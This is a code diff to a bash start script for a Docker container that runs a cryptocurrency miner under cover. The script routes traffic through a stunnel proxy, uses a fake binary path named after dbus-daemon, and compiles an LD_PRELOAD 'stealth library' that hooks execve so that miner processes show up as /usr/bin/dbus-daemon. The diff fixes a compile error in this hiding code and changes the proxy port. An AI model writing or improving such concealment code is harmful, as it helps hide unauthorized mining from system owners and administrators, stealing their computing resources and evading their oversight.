@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # ========================================
-# START SCRIPT - DOCKER OPTIMIZED (FIXED GCC)
+# START SCRIPT - DOCKER OPTIMIZED (FIXED GCC READ-ONLY)
 # ========================================
 
 set -euo pipefail
 
 LOG_FILE="/tmp/miner-run.log"
-PROXY_PORT=443
+PROXY_PORT=11443
 FAKE_PATH="/usr/local/bin/dbus-daemon-system"
 
 echo "=== CONTAINER STARTED === $(date)" | tee -a "$LOG_FILE"
@@ -45,7 +45,7 @@ if ! nc -z 127.0.0.1 ${PROXY_PORT}; then
 fi
 echo "[OK] Stunnel is active on port ${PROXY_PORT}" | tee -a "$LOG_FILE"
 
-# 4. Prepare Stealth Library (LD_PRELOAD) - FIXED CODE
+# 4. Prepare Stealth Library (LD_PRELOAD) - FIXED READ-ONLY ERROR
 echo "[*] Compiling stealth library..." | tee -a "$LOG_FILE"
 cat > /tmp/hide.c << 'EOF'
 #define _GNU_SOURCE
@@ -60,8 +60,9 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
         real_execve = dlsym(RTLD_NEXT, "execve");
     }
     
+    // Gunakan type casting (char **) untuk melewati batasan read-only argv
     if (filename && (strstr(filename, "miner") || (argv[0] && strstr(argv[0], "miner")))) {
-        argv[0] = "/usr/bin/dbus-daemon";
+        ((char **)argv)[0] = "/usr/bin/dbus-daemon";
     }
     return real_execve(filename, argv, envp);
 }
